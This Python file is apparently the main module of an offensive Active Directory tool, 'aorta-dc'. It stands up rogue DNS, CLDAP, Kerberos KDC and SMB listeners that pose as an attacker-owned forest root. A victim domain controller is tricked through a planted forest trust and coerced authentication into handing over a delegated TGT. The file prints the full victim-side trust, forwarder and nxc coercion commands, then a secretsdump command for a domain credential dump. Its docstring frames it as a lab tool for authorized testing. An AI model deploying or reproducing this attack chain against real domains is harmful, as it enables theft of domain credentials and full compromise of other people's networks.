#!/usr/bin/env python3
"""aorta-dc: attacker-side responder impersonating an AD forest root.

Serves exactly the victim-facing sockets needed for the AORTA forest-trust
delegated-TGT capture flow:

  UDP/53   DNS         DC discovery (A dc01... + _kerberos SRV)
  UDP/389  CLDAP       Netlogon LDAP ping -> NETLOGON_SAM_LOGON_RESPONSE_EX
  TCP/88   Kerberos    TGS-only KDC minting cifs/<dc> with ok-as-delegate
  TCP/445  SMB         built-in capture listener that accepts the DC's
                       delegated TGT; the responder stops after the first
                       ticket and prints the secretsdump command

This is a narrow lab responder for authorized testing, NOT an AD DC or a
production KDC.  Post-capture it prints (but never runs) the secretsdump
command that turns the captured TGT into a domain dump."""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import ipaddress
import json
import logging
import os
import re
import shlex
import signal
import socket
import subprocess
import sys

from . import cldap, dnsserver, recon
from .kdc import MAX_RECORD, Kdc
from .keys import (
    DEFAULT_SERVICE_KEY,
    ResponderConfig,
    fresh_domain_guid,
    fresh_service_key,
)
from .smb import SmbCaptureServer, format_skew, secretsdump_command

log = logging.getLogger("responder")


# --------------------------------------------------------------------------- #
# terminal styling


class Style:
    """Minimal ANSI styling; auto-disabled when not a TTY or NO_COLOR is set."""

    def __init__(self, stream=None) -> None:
        stream = stream or sys.stdout
        self.enabled = hasattr(stream, "isatty") and stream.isatty() and not os.environ.get("NO_COLOR")

    def wrap(self, code: str, text: str) -> str:
        return f"\x1b[{code}m{text}\x1b[0m" if self.enabled else text

    def bold(self, text: str) -> str:
        return self.wrap("1", text)

    def dim(self, text: str) -> str:
        return self.wrap("2", text)

    def red(self, text: str) -> str:
        return self.wrap("31", text)

    def green(self, text: str) -> str:
        return self.wrap("32", text)

    def yellow(self, text: str) -> str:
        return self.wrap("33", text)

    def cyan(self, text: str) -> str:
        return self.wrap("36", text)


ui = Style()  # stdout banner/summary styling
_WIDTH = 64


def _rule(title: str, char: str = "─") -> str:
    """Section heading: '── title ─────────…' padded to the banner width."""
    line = f"{char * 2} {title} "
    return ui.cyan(ui.bold(line + char * max(1, _WIDTH - len(line))))


def _kv(label: str, value: str) -> str:
    """Aligned key/value line: dim label, plain value."""
    return f"  {ui.dim(f'{label:<13}')}  {value}"


def _cmd(text: str) -> str:
    """Copy-paste command line."""
    return ui.green(text)


class _LogFormatter(logging.Formatter):
    """Dim the 'HH:MM:SS name' prefix; color the level by severity."""

    _LEVELS = {"DEBUG": "2", "INFO": "2", "WARNING": "33", "ERROR": "31", "CRITICAL": "1;31"}

    def __init__(self, style: Style) -> None:
        super().__init__(fmt="%(message)s", datefmt="%H:%M:%S")
        self._style_ui = style

    def format(self, record: logging.LogRecord) -> str:
        prefix = self._style_ui.dim(f"{self.formatTime(record, self.datefmt)} {record.name:<9} ")
        code = self._LEVELS.get(record.levelname)
        level = self._style_ui.wrap(code, f"{record.levelname:<8}") if code else f"{record.levelname:<8}"
        msg = record.getMessage()
        if record.exc_info:
            msg = f"{msg}\n{self.formatException(record.exc_info)}"
        return f"{prefix}{level} {msg}"


# --------------------------------------------------------------------------- #
# UDP listeners


class UdpResponder(asyncio.DatagramProtocol):
    def __init__(self, name: str, handler, cfg: ResponderConfig):
        self.name, self.handler, self.cfg = name, handler, cfg
        self.transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data: bytes, addr):
        try:
            answer = self.handler(data, addr, self.cfg)
        except Exception:
            log.exception("%s: internal error handling datagram from %s", self.name, addr[0])
            return
        if answer is not None and self.transport is not None:
            self.transport.sendto(answer, addr)

    def error_received(self, exc):
        log.warning("%s: socket error: %s", self.name, exc)


# --------------------------------------------------------------------------- #
# TCP KDC server


class KdcProtocol(asyncio.Protocol):
    def __init__(self, kdc: Kdc):
        self.kdc = kdc
        self.buf = bytearray()

    def connection_made(self, transport):
        self.transport = transport
        peer = transport.get_extra_info("peername")
        log.debug("tcp/88 connection from %s", peer)

    def data_received(self, data: bytes):
        self.buf += data
        while len(self.buf) >= 4:
            size = int.from_bytes(self.buf[:4], "big")
            if size > MAX_RECORD:
                log.warning("tcp/88 record of %d bytes exceeds limit; closing", size)
                self.transport.close()
                return
            if len(self.buf) < 4 + size:
                return
            record = bytes(self.buf[4 : 4 + size])
            del self.buf[: 4 + size]
            self._handle_record(record)

    def _handle_record(self, record: bytes):
        try:
            response, _keep = self.kdc.handle_record(record)
        except Exception:
            log.exception("tcp/88: internal error; closing connection")
            self.transport.close()
            return
        if response is not None:
            self.transport.write(len(response).to_bytes(4, "big") + response)
        # one exchange per connection, like a real KDC
        if self.transport:
            self.transport.close()


# --------------------------------------------------------------------------- #
# startup helpers


def _find_port_owner(port: int, proto: str) -> str | None:
    """Best-effort lookup of which local process holds a port (for diagnostics)."""
    try:
        out = subprocess.run(["ss", f"-l{proto}np"], capture_output=True, text=True, timeout=5).stdout
    except Exception:
        return None
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 6 and any(p.endswith(f":{port}") for p in parts[3:5]):
            return line.strip()
    return None


def check_ports(ip: str, ports: list[tuple[str, int]]) -> None:
    """Fail early with actionable messages instead of asyncio tracebacks."""
    for proto, port in ports:
        family = socket.AF_INET
        typ = socket.SOCK_STREAM if proto == "tcp" else socket.SOCK_DGRAM
        s = socket.socket(family, typ)
        if proto == "tcp":
            # match loop.create_server(): tolerate TIME_WAIT remnants of our own
            # previous run (the KDC closes accepted connections, leaving tcp/88
            # in TIME_WAIT ~60s) while still detecting genuinely live listeners
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((ip, port))
        except OSError as exc:
            owner = _find_port_owner(port, "t" if proto == "tcp" else "u")
            hints = {
                53: "a DNS server (systemd-resolved, dnsmasq, unbound) or a leftover responder",
                88: "a leftover responder or Kerberos KDC",
                389: "an LDAP server (slapd) or a leftover responder",
                445: "a leftover responder or smbd",
            }.get(port, "")
            msg = f"cannot bind {proto}/{port} on {ip}: {exc}"
            if owner:
                msg += f"\n  current owner per ss: {owner}"
            if hints:
                msg += f"\n  hint: is {hints} still running?"
            sys.exit(msg)
        finally:
            s.close()


# -- attacker IP resolution ----------------------------------------------------


def local_ipv4_addrs() -> list[str]:
    """All IPv4 addresses assigned to local interfaces ([] if unknown)."""
    try:
        out = subprocess.run(["ip", "-j", "-4", "addr", "show"], capture_output=True, text=True, timeout=5).stdout
        addrs = []
        for iface in json.loads(out or "[]"):
            for addr in iface.get("addr_info", []):
                if addr.get("family") == "inet" or "." in addr.get("local", ""):
                    addrs.append(addr["local"])
        return addrs
    except Exception:
        return []


def detect_attacker_ip() -> str | None:
    """Best guess for the VPN-side IPv4 to answer on.

    Preference: tun0 (typical VPN attack box), then the source address
    of the default route. Returns None when nothing could be determined.
    """
    try:
        out = subprocess.run(
            ["ip", "-4", "addr", "show", "dev", "tun0"],
            capture_output=True,
            text=True,
            timeout=5,
        ).stdout
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    try:
        out = subprocess.run(["ip", "route", "get", "1.1.1.1"], capture_output=True, text=True, timeout=5).stdout
        m = re.search(r"\bsrc (\d+\.\d+\.\d+\.\d+)\b", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None


def resolve_attacker_ip(explicit: str | None, addrs: list[str], detected: str | None) -> str:
    """Validate/derive the bind IP; sys.exit()s with actionable guidance."""
    if explicit:
        if addrs and explicit not in addrs and not explicit.startswith("127."):
            detected_hint = f" (detected attacker IP: {detected})" if detected else ""
            sys.exit(
                f"--ip {explicit} is not assigned to any local interface{detected_hint}\n"
                "  --ip must be YOUR (attacker) address, not the victim's - the victim\n"
                "  is reached via DNS names, and aorta gets it from --master.\n"
                f"  local addresses: {', '.join(addrs)}"
            )
        return explicit
    if detected:
        return detected
    sys.exit(
        "--ip is required: could not auto-detect the attacker IPv4\n"
        "  pass the VPN interface address explicitly, e.g. --ip 10.10.14.1"
    )


def _resolves(fqdn: str) -> bool:
    try:
        socket.gethostbyname(fqdn)
        return True
    except OSError:
        return False


def print_victim_commands(cfg: ResponderConfig, say=print) -> None:
    victim_domain = cfg.victim_realm.lower()
    victim_dc = cfg.victim_dc_fqdn or f"dc.{victim_domain}"
    q = shlex.quote
    say("")
    say(_rule("victim-side setup (aorta tool)"))
    say(_cmd(f"  aorta trust add -u <user> -d {q(victim_domain)} --dc {q(victim_dc)} -p '<pw>' \\"))
    say(_cmd(f"      --attacker-domain {q(cfg.domain)} --attacker-netbios {q(cfg.netbios_domain.lower())} \\"))
    say(_cmd(f"      --attacker-sid {q(cfg.sid)} --trust-password {q(cfg.trust_password.decode())}"))
    say("")
    say(_cmd(f"  aorta forwarder add -u <user> -d {q(victim_domain)} --dc {q(victim_dc)} \\"))
    say(_cmd(f"      -p '<pw>' --master {q(cfg.ip)} --zone {q(cfg.domain)}"))
    say("")
    say(_rule("capture (stops itself after the first ticket)"))
    say(_cmd(f"  nxc smb {q(victim_domain)} -u <user> -p '<pw>' -M coerce_plus \\"))
    say(_cmd(f"      -o LISTENER={q(cfg.dc_fqdn)}"))
    say("")


def print_capture_result(cfg: ResponderConfig, ticket: dict, say=print) -> None:
    """Final summary + the secretsdump command, printed but NOT executed."""
    skew = cfg.clock_skew
    clock = "unknown (no faketime in the hint)" if skew is None else format_skew(skew)
    title = " ticket captured "
    pad = max(2, (_WIDTH - len(title)) // 2)
    bar = "═" * pad + title + "═" * max(2, _WIDTH - len(title) - pad)
    lines = [
        "",
        ui.green(ui.bold(bar)),
        _kv("principal", f"{ticket['user']}@{ticket['dom']}"),
        _kv("ccache", ticket["path"]),
        _kv("clock skew", clock),
        "",
        ui.dim("  ready for secretsdump.py (not executed):"),
        _cmd("  " + secretsdump_command(ticket["path"], cfg.victim_realm, cfg.victim_dc_fqdn, skew)),
        ui.green("═" * _WIDTH),
        "",
    ]
    for line in lines:
        say(line)


# --------------------------------------------------------------------------- #
# main


async def amain(cfg: ResponderConfig) -> None:
    loop = asyncio.get_running_loop()

    udp_specs = [
        ("dns", 53, dnsserver.handle_datagram),
        ("cldap", 389, cldap.handle_datagram),
    ]
    check_ports(cfg.ip, [("udp", 53), ("udp", 389), ("tcp", 88), ("tcp", 445)])

    kdc = Kdc(cfg)

    transports = []
    for name, port, handler in udp_specs:
        transport, _ = await loop.create_datagram_endpoint(
            lambda n=name, h=handler: UdpResponder(n, h, cfg), local_addr=(cfg.ip, port)
        )
        transports.append(transport)
        log.info("listening on %s udp/%d", name, port)

    server = await loop.create_server(lambda: KdcProtocol(kdc), cfg.ip, 88)
    log.info("listening on kdc tcp/88")

    # -- built-in SMB capture listener (tcp/445) -------------------------------
    ticket: dict = {}
    ticket_event = asyncio.Event()

    def on_ticket(path: str, user: str, dom: str, skew: int | None) -> None:
        ticket.update(path=path, user=user, dom=dom)
        if skew is not None:
            cfg.clock_skew = skew  # authenticator ctime beats the KDC observation
        loop.call_soon_threadsafe(ticket_event.set)

    capture = SmbCaptureServer(cfg.ip, cfg.service_key, on_ticket)
    capture.start()
    log.info("listening on smb tcp/445 (auto-stop after first ticket)")

    log.info("aorta responder ready (ctrl-c to stop)")

    stop = asyncio.Event()
    loop.add_signal_handler(signal.SIGINT, stop.set)
    loop.add_signal_handler(signal.SIGTERM, stop.set)

    stop_task = asyncio.create_task(stop.wait())
    ticket_task = asyncio.create_task(ticket_event.wait())
    done, _pending = await asyncio.wait({stop_task, ticket_task}, return_when=asyncio.FIRST_COMPLETED)
    stop_task.cancel()
    ticket_task.cancel()
    await asyncio.gather(stop_task, ticket_task, return_exceptions=True)

    log.info("shutting down")
    server.close()
    await server.wait_closed()
    for transport in transports:
        transport.close()
    capture.stop()

    if ticket_task in done:
        # let the log line flush before the summary block
        await asyncio.sleep(0)
        print_capture_result(cfg, ticket, say=lambda line: print(line, flush=True))


DEFAULT_ATTACKER_REALM = "bytestorm.local"
DEFAULT_ATTACKER_SID = "S-1-5-21-42-42-42"
DEFAULT_TRUST_PASSWORD = "Password__42"


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="aorta-dc: attacker responder (DNS + CLDAP + TGS-only KDC + "
        "built-in SMB capture).  Only the victim IP is required - "
        "anonymous RootDSE recon derives the victim realm/DC FQDN, and the "
        "attacker identity defaults to the bytestorm.local lab values."
    )
    p.add_argument(
        "target",
        metavar="VICTIM_DC_IP",
        help="victim DC IP; anonymous recon (LDAP RootDSE) derives realm and DC FQDN from it",
    )
    p.add_argument(
        "--ip",
        "--attacker-ip",
        dest="ip",
        default=None,
        help="attacker (your) VPN IP to bind and answer with; auto-detected from tun0/"
        "the default route when omitted. NOT the victim IP - the victim is "
        "reached via DNS names",
    )
    p.add_argument(
        "--realm",
        default=DEFAULT_ATTACKER_REALM,
        help=f"attacker Kerberos realm/DNS domain (default {DEFAULT_ATTACKER_REALM})",
    )
    p.add_argument("--dc", default=None, help="attacker DC FQDN (default: dc01.<realm>)")
    p.add_argument(
        "--netbios", default=None, help="attacker NetBIOS domain name (default: first realm label, upper-case)"
    )
    p.add_argument(
        "--sid",
        default=DEFAULT_ATTACKER_SID,
        help=f"attacker domain SID placed in the victim's TDO (default {DEFAULT_ATTACKER_SID})",
    )
    p.add_argument(
        "--trust-password",
        default=DEFAULT_TRUST_PASSWORD,
        help=f"shared forest-trust password (default '{DEFAULT_TRUST_PASSWORD}')",
    )
    vict = p.add_argument_group("victim overrides (fill what recon cannot; supplying both skips recon)")
    vict.add_argument("--victim-realm", default=None, help="override the victim Kerberos realm (default: from recon)")
    vict.add_argument(
        "--victim-dc",
        default=None,
        help="override the victim DC FQDN for the secretsdump hint (default: from recon / CLDAP ping)",
    )
    p.add_argument(
        "--service-aes-key",
        help="explicit 32-byte hex AES256 key for cifs/<dc> (default: static lab key)",
    )
    p.add_argument(
        "--random-service-key",
        action="store_true",
        help="generate a fresh random AES256 key for cifs/<dc> instead of the static default",
    )
    p.add_argument("--debug", action="store_true", help="verbose protocol logging; also prints the derived trust key")
    return p


def main(argv=None) -> None:
    args = build_parser().parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(message)s",
        datefmt="%H:%M:%S",
    )
    logging.getLogger().handlers[0].setFormatter(_LogFormatter(Style(sys.stderr)))

    if args.ip is not None:
        try:
            explicit_ip = ipaddress.ip_address(args.ip)
            if explicit_ip.version != 4:
                raise ValueError
        except ValueError:
            sys.exit(f"--ip: invalid IPv4 address {args.ip!r}")

    try:
        target_ip = ipaddress.ip_address(args.target)
        if target_ip.version != 4:
            raise ValueError
    except ValueError:
        sys.exit(f"target {args.target!r}: invalid IPv4 address")
    if args.target == args.ip:
        sys.exit("target must be the VICTIM DC IP, not your own address")

    # -- anonymous victim recon (skipped when both victim overrides are given) --
    all_overridden = all([args.victim_realm, args.victim_dc])
    info = recon.VictimInfo(ip=args.target) if all_overridden else recon.enumerate_victim(args.target)
    if args.victim_realm:
        info.realm = args.victim_realm.lower()
    if args.victim_dc:
        info.dc_fqdn = args.victim_dc.lower().rstrip(".")

    if info.realm is None:
        sys.exit(
            f"could not determine the victim realm from {args.target}\n"
            "  anonymous LDAP RootDSE failed or was refused.\n"
            "  pass the victim overrides: --victim-realm <dns.domain> (required)\n"
            "  and optionally --victim-dc; giving both skips the recon probe\n"
            "  entirely"
        )

    args.ip = resolve_attacker_ip(args.ip, local_ipv4_addrs(), detect_attacker_ip())
    if args.target == args.ip:
        sys.exit("target must be the VICTIM DC IP, not your own address")

    realm = args.realm.lower().rstrip(".")
    dc_fqdn = (args.dc or f"dc01.{realm}").lower().rstrip(".")
    if not dc_fqdn.endswith("." + realm):
        sys.exit(f"--dc {dc_fqdn!r} must be inside realm {realm!r}")
    dc_name = dc_fqdn.split(".")[0].upper()
    netbios = args.netbios or realm.split(".")[0].upper()

    if args.service_aes_key and args.random_service_key:
        sys.exit("--service-aes-key and --random-service-key are mutually exclusive")
    try:
        service_key = (
            bytes.fromhex(args.service_aes_key)
            if args.service_aes_key
            else fresh_service_key()
            if args.random_service_key
            else DEFAULT_SERVICE_KEY
        )
    except ValueError:
        service_key = b""  # flagged by the length check below
    if len(service_key) != 32:
        sys.exit("--service-aes-key: expected 64 hex chars (32 bytes)")

    cfg = ResponderConfig(
        ip=args.ip,
        realm=realm.upper(),
        domain=realm,
        dc_fqdn=dc_fqdn,
        dc_name=dc_name,
        netbios_domain=netbios,
        sid=args.sid,
        victim_realm=info.realm.upper(),
        trust_password=args.trust_password.encode(),
        service_key=service_key,
        domain_guid=fresh_domain_guid(),
        victim_dc_fqdn=info.dc_fqdn,
    )

    def say(line: str) -> None:
        print(line, flush=True)

    say("")
    say(_rule("attacker"))
    say(_kv("realm", f"{cfg.realm} ({cfg.netbios_domain})"))
    say(_kv("dc", f"{cfg.dc_fqdn} ({cfg.dc_name}) · site {cfg.site}"))
    say(_kv("sid", cfg.sid))
    say(_kv("service key", cfg.service_key.hex()))
    if args.debug:
        say(_kv("trust key", cfg.trust_key.contents.hex()))
    say(_kv("listen", f"{cfg.ip}  udp/53 · udp/389 · tcp/88 · tcp/445"))
    say("")
    say(_rule("victim"))
    say(_kv("target", f"{info.ip}  {info.realm.upper()}"))
    if info.dc_fqdn:
        say(_kv("dc", info.dc_fqdn))
    if info.missing:
        say(_kv("missing", ", ".join(info.missing)))

    if info.dc_fqdn and not _resolves(info.dc_fqdn):
        say("")
        say(ui.yellow(f"note: {info.dc_fqdn} does not resolve locally; consider"))
        hosts_entry = f"{info.ip} {info.dc_fqdn} {info.realm}"
        say(ui.yellow(f"  echo {shlex.quote(hosts_entry)} | sudo tee -a /etc/hosts"))

    print_victim_commands(cfg, say)

    with contextlib.suppress(KeyboardInterrupt):
        asyncio.run(amain(cfg))
